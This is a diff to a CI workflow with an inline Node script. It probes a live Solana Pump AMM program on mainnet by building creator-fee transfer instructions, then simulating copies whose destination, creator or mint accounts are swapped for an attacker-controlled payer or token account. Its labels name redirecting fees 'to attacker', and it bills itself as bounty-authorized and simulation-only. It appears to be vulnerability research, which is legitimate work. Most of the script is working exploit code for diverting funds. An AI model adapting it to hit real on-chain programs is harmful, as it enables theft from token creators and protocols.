@@ -18,9 +18,9 @@ jobs:
         shell: bash
         run: |
           node --input-type=module <<'NODE'
-          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction,Keypair} from '@solana/web3.js';
+          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
           import {NATIVE_MINT,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,getAssociatedTokenAddressSync,AccountLayout} from '@solana/spl-token';
-          import {OnlinePumpAmmSdk,getPumpAmmProgram,coinCreatorVaultAuthorityPda,coinCreatorVaultAtaPda,PUMP_AMM_SDK} from '@pump-fun/pump-swap-sdk';
+          import {OnlinePumpAmmSdk,getPumpAmmProgram,coinCreatorVaultAuthorityPda,coinCreatorVaultAtaPda} from '@pump-fun/pump-swap-sdk';
           import {PUMP_PROGRAM_ID} from '@pump-fun/pump-sdk';
 
           const RPC='https://api.mainnet-beta.solana.com', c=new Connection(RPC,'confirmed'), online=new OnlinePumpAmmSdk(c), program=getPumpAmmProgram(c);
@@ -29,32 +29,48 @@ jobs:
           const MIG_POOL=new PublicKey('4ryg4gxs2MwVfuMeDXVKkRbmCYSgAA3B8eZtw6tT9bEq');
           const [EVENT_AUTH]=PublicKey.findProgramAddressSync([Buffer.from('__event_authority')],program.programId);
           const SYS=new PublicKey('11111111111111111111111111111111');
-          const safe=v=>v?.toBase58?.()??v?.toString?.()??v;
           const amt=(ai)=>{if(!ai?.data||ai.data.length<165)return null;try{return AccountLayout.decode(ai.data).amount.toString()}catch{return null}};
           const pumpCreatorVault=(coin)=>PublicKey.findProgramAddressSync([Buffer.from('creator-vault'),coin.toBuffer()],PUMP_PROGRAM_ID)[0];
           const sourceFor=(coin,mint=NATIVE_MINT,tp=TOKEN_PROGRAM_ID)=>{const auth=coinCreatorVaultAuthorityPda(coin);return {auth,ata:coinCreatorVaultAtaPda(auth,mint,tp)}};
 
           function ixClone(ix,mut){const keys=ix.keys.map(k=>({...k}));mut(keys);return new TransactionInstruction({programId:ix.programId,keys,data:Buffer.from(ix.data)})}
           function parse(logs){const t=(logs??[]).join('\n');return {account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|Transfer|CloseAccount|SyncNative|creator|sharing|failed|success/i.test(x)).slice(-120)}}
-          async function sim(label,ixs,watch){const pre=await c.getMultipleAccountsInfo(watch,'confirmed');const {blockhash}=await c.getLatestBlockhash('processed');const tx=new VersionedTransaction(new TransactionMessage({payerKey:PAYER,recentBlockhash:blockhash,instructions:ixs}).compileToV0Message());const raw=Buffer.from(tx.serialize()).toString('base64');const body={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}]};const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-transfer-creator-v1-v2/1.0'},body:JSON.stringify(body)});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));const v=j.result.value,e=parse(v.logs);const post=v.accounts??[];const summarize=(a,i)=>({pk:watch[i].toBase58(),exists:!!a,owner:a?.owner??null,lamports:a?.lamports??null,tokenAmount:a?.data?.[0]?amt({data:Buffer.from(a.data[0],'base64')}):null});console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,pre:pre.map(summarize),post:post.map(summarize),interesting:e.interesting},null,2));return {v,e,pre,post}}
+          async function sim(label,ixs,watch){
+            const pre=await c.getMultipleAccountsInfo(watch,'confirmed');
+            const {blockhash}=await c.getLatestBlockhash('processed');
+            const tx=new VersionedTransaction(new TransactionMessage({payerKey:PAYER,recentBlockhash:blockhash,instructions:ixs}).compileToV0Message());
+            const raw=Buffer.from(tx.serialize()).toString('base64');
+            const body={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}]};
+            const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-transfer-creator-v1-v2/1.0'},body:JSON.stringify(body)});
+            const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));
+            const v=j.result.value,e=parse(v.logs),post=v.accounts??[];
+            const summarizePre=(a,i)=>({pk:watch[i].toBase58(),exists:!!a,owner:a?.owner?.toBase58?.()??null,lamports:a?.lamports??null,tokenAmount:a?amt(a):null});
+            const summarizePost=(a,i)=>{let d=null;if(a?.data?.[0]&&typeof a.data[0]==='string')d=Buffer.from(a.data[0],'base64');return {pk:watch[i].toBase58(),exists:!!a,owner:a?.owner??null,lamports:a?.lamports??null,tokenAmount:d?amt({data:d}):null}};
+            console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,pre:pre.map(summarizePre),post:post.map(summarizePost),interesting:e.interesting},null,2));return {v,e,pre,post}
+          }
 
           for(const [tag,poolPk] of [['nonmigrated',NONMIG_POOL],['migrated',MIG_POOL]]){
             let pool;try{pool=await online.fetchPool(poolPk)}catch(e){console.log('POOL_FAIL',tag,String(e));continue}
-            const coin=pool.coinCreator;const src=sourceFor(coin);const pumpVault=pumpCreatorVault(coin);const pumpVaultAta=getAssociatedTokenAddressSync(NATIVE_MINT,pumpVault,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);const infos=await c.getMultipleAccountsInfo([src.ata,pumpVault,pumpVaultAta],'confirmed');
+            const coin=pool.coinCreator,src=sourceFor(coin),pumpVault=pumpCreatorVault(coin),pumpVaultAta=getAssociatedTokenAddressSync(NATIVE_MINT,pumpVault,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+            const infos=await c.getMultipleAccountsInfo([src.ata,pumpVault,pumpVaultAta],'confirmed');
             console.log('\nCONTEXT',tag,JSON.stringify({pool:poolPk.toBase58(),baseMint:pool.baseMint.toBase58(),quoteMint:pool.quoteMint.toBase58(),creator:pool.creator.toBase58(),coinCreator:coin.toBase58(),isMayhem:pool.isMayhemMode,isCashback:pool.isCashbackCoin,sourceAuthority:src.auth.toBase58(),sourceAta:src.ata.toBase58(),sourceExists:!!infos[0],sourceAmount:amt(infos[0]),pumpCreatorVault:pumpVault.toBase58(),pumpVaultExists:!!infos[1],pumpVaultLamports:infos[1]?.lamports??null,pumpVaultAta:pumpVaultAta.toBase58(),pumpVaultAtaExists:!!infos[2],pumpVaultAtaAmount:amt(infos[2])},null,2));
             if(!infos[0]||BigInt(amt(infos[0])??'0')===0n){console.log('SKIP_ZERO_SOURCE',tag);continue}
 
-            // Build v1 explicitly from the published IDL layout. No signer is required by the instruction.
-            let v1;
-            try{v1=await program.methods.transferCreatorFeesToPump().accountsPartial({wsolMint:NATIVE_MINT,tokenProgram:TOKEN_PROGRAM_ID,systemProgram:SYS,associatedTokenProgram:ASSOCIATED_TOKEN_PROGRAM_ID,coinCreator:coin,coinCreatorVaultAuthority:src.auth,coinCreatorVaultAta:src.ata,pumpCreatorVault:pumpVault,eventAuthority:EVENT_AUTH,program:program.programId}).instruction()}catch(e){console.log('V1_BUILD_FAIL',tag,String(e));v1=null}
-            if(v1){console.log('V1_KEYS',tag,JSON.stringify(v1.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));await sim(tag+'_v1_control',[v1],[src.ata,pumpVault]);
+            let v1;try{v1=await program.methods.transferCreatorFeesToPump().accountsPartial({wsolMint:NATIVE_MINT,tokenProgram:TOKEN_PROGRAM_ID,systemProgram:SYS,associatedTokenProgram:ASSOCIATED_TOKEN_PROGRAM_ID,coinCreator:coin,coinCreatorVaultAuthority:src.auth,coinCreatorVaultAta:src.ata,pumpCreatorVault:pumpVault,eventAuthority:EVENT_AUTH,program:program.programId}).instruction()}catch(e){console.log('V1_BUILD_FAIL',tag,String(e));v1=null}
+            if(v1){
+              console.log('V1_KEYS',tag,JSON.stringify(v1.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+              await sim(tag+'_v1_control',[v1],[src.ata,pumpVault]);
               const dst=v1.keys.findIndex(k=>k.pubkey.equals(pumpVault));if(dst>=0)await sim(tag+'_v1_redirect_pump_vault_to_attacker',[ixClone(v1,keys=>keys[dst].pubkey=PAYER)],[src.ata,pumpVault,PAYER]);
               const ci=v1.keys.findIndex(k=>k.pubkey.equals(coin));if(ci>=0)await sim(tag+'_v1_coin_creator_to_attacker_keep_old_vaults',[ixClone(v1,keys=>keys[ci].pubkey=PAYER)],[src.ata,pumpVault]);
               const mi=v1.keys.findIndex(k=>k.pubkey.equals(NATIVE_MINT));if(mi>=0){const usdc=new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');await sim(tag+'_v1_wsol_mint_to_usdc_keep_old_source',[ixClone(v1,keys=>keys[mi].pubkey=usdc)],[src.ata,pumpVault])}
             }
 
-            // V2 uses an arbitrary payer only to create the canonical Pump destination ATA.
             let v2;try{v2=await program.methods.transferCreatorFeesToPumpV2().accountsPartial({payer:PAYER,quoteMint:NATIVE_MINT,tokenProgram:TOKEN_PROGRAM_ID,systemProgram:SYS,associatedTokenProgram:ASSOCIATED_TOKEN_PROGRAM_ID,coinCreator:coin,coinCreatorVaultAuthority:src.auth,coinCreatorVaultAta:src.ata,pumpCreatorVault:pumpVault,pumpCreatorVaultAta:pumpVaultAta,eventAuthority:EVENT_AUTH,program:program.programId}).instruction()}catch(e){console.log('V2_BUILD_FAIL',tag,String(e));v2=null}
-            if(v2){console.log('V2_KEYS',tag,JSON.stringify(v2.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));await sim(tag+'_v2_control',[v2],[src.ata,pumpVault,pumpVaultAta]);const dai=v2.keys.findIndex(k=>k.pubkey.equals(pumpVaultAta));if(dai>=0){const attackerAta=getAssociatedTokenAddressSync(NATIVE_MINT,PAYER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);await sim(tag+'_v2_redirect_destination_to_attacker_ata',[ixClone(v2,keys=>keys[dai].pubkey=attackerAta)],[src.ata,pumpVaultAta,attackerAta])}const dp=v2.keys.findIndex(k=>k.pubkey.equals(pumpVault));if(dp>=0)await sim(tag+'_v2_pump_vault_to_attacker',[ixClone(v2,keys=>keys[dp].pubkey=PAYER)],[src.ata,pumpVault,pumpVaultAta]);}
+            if(v2){
+              console.log('V2_KEYS',tag,JSON.stringify(v2.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+              await sim(tag+'_v2_control',[v2],[src.ata,pumpVault,pumpVaultAta]);
+              const dai=v2.keys.findIndex(k=>k.pubkey.equals(pumpVaultAta));if(dai>=0){const attackerAta=getAssociatedTokenAddressSync(NATIVE_MINT,PAYER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);await sim(tag+'_v2_redirect_destination_to_attacker_ata',[ixClone(v2,keys=>keys[dai].pubkey=attackerAta)],[src.ata,pumpVaultAta,attackerAta])}
+              const dp=v2.keys.findIndex(k=>k.pubkey.equals(pumpVault));if(dp>=0)await sim(tag+'_v2_pump_vault_to_attacker',[ixClone(v2,keys=>keys[dp].pubkey=PAYER)],[src.ata,pumpVault,pumpVaultAta]);
+            }
           }
           NODE
